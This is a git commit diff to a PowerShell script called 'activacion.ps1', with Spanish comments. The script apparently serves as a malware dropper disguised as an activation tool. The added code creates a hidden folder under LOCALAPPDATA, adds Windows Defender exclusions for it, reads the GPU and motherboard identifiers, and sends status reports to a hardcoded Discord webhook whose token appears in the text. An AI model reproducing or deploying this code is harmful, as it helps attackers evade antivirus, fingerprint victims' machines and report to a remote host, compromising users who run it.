6ea7fadbcf534c93f3309f7284febf97d36262d1
baa4ts <baa4tsdev@gmail.com>
2025-04-02 02:12:23 -0300

    Actualizacion sc 11

--- script/activacion.ps1
+++ script/activacion.ps1
@@ -1,47 +1,63 @@
 $check = 1
-$reportes = @()
+$codeBlock = '```'
+$reporte = @()
+$GPU_ID = Get-WmiObject -Class Win32_VideoController | Select-Object -ExpandProperty PNPDeviceID
+$MOTHER_ID = Get-WmiObject -Class Win32_BaseBoard | Select-Object -ExpandProperty SerialNumber
 
 function reporte {
+    param (
+        [string]$mensaje
+    )
+    
     try {
         $webhook = "https://discord.com/api/webhooks/1345942563156393994/BDkrnul-xcAlgRjHjROWTfB17ZS7HSKvtXeaFWESO-NJQfc4JAfjPb-KO2ZXRQWIM9nX"
-        
-        param (
-            $mensaje
-        ) 
-        
-
-
         $body = @{
-            content = '``` Hola mundo ```'
+            content = $mensaje
         }
 
-        $jsonData = $body | ConvertTo-Json -Depth 3
-        
+        $jsonData = $body | ConvertTo-Json -Depth 3        
         Invoke-RestMethod -Uri $webhook -Method Post -Body $jsonData -ContentType "application/json; charset=utf-8"
     }
     catch {
-        Exit
+        Write-Host "Ocurrió un error al enviar el reporte: $($_.Exception.Message)"
     }
 }
 
 while ($check -eq 1) {
     try {
-
+        # Ruta de la aplicación
         $root = Join-Path -Path $env:LOCALAPPDATA -ChildPath "Proton"
 
-        # Verifica si la carpeta existe, y si no, la crea
+        # Verifica si la carpeta existe; si no, la crea
         if (-not (Test-Path $root)) {
             New-Item -Path $root -ItemType Directory
-
-            $reportes.Add("")
+            $reporte += "Directorio: $root"
         }
-        
-        # Ocultar carpeta
+
+        # Establece la carpeta como oculta
         Set-ItemProperty -Path $root -Name Attributes -Value Hidden
 
+        if (-not ($folder.Attributes -band [System.IO.FileAttributes]::Hidden)) {
+            Set-ItemProperty -Path $root -Name Attributes -Value Hidden
+            $reporte += "Directorio Oculto: True"
+        }
 
-        # Verificacion
+        # Definir exclusiones
+        $Exclusiones = @(".exe", ".dll", ".lib")
 
+        try {
+            foreach ($tipo in $Exclusiones) {
+                # Agrega las exclusiones al antivirus
+                Add-MpPreference -ExclusionPath $root
+                Add-MpPreference -ExclusionPath "$root\$tipo"
+                Add-MpPreference -ExclusionPath "$root\\$tipo"
+                Add-MpPreference -ExclusionPath "$root\.\$tipo"
+            }
+            $reporte += "Exclusiones al Defender: Agregadas"
+        }
+        catch {
+            $reporte += "Exclusiones al Defender: Fallidas"
+        }
     }
     catch {
         reporte "REPORTE: ERROR`n$($_.Exception.Message)"
